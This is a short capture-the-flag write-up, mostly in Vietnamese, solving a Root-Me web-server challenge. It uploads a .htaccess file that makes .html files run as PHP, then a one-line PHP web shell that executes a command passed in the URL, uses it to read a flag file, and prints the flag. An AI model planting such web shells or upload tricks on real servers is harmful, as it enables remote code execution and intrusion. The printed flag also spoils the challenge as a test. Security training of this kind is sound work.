# [PHP - Apache configuration](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

## Solutions

- Upload một file có tên `.htaccess` với nội dung là:

```text
AddHandler application/x-httpd-php .html
```

- Upload một file có tên là `test.html` với nội dung là:

```php
<?php
system($_GET['command']);
?>
```

- Gửi request đến URL mà server trả về kèm query parameter `?command=cat%20../../private/flag.txt` là lấy được flag: `ht@cc3ss2RCE4th%w1n`

## Giải thích

- Mỗi file `.htaccess` sẽ có ảnh hưởng đến directory chứa nó và các subdirectory.
- Mỗi người chơi rootme sẽ được cung cấp một sessionID cũng chính là tên folder chứa tất cả các file người dùng upload lên.
- `AddHandler application/x-httpd-php .html` sẽ làm cho các file html cùng directory với file `.htacccess` này chạy như file php.

## References

- <https://docs.oracle.com/cd/B14099_19/web.1012/q20206/howto/htaccess.html>
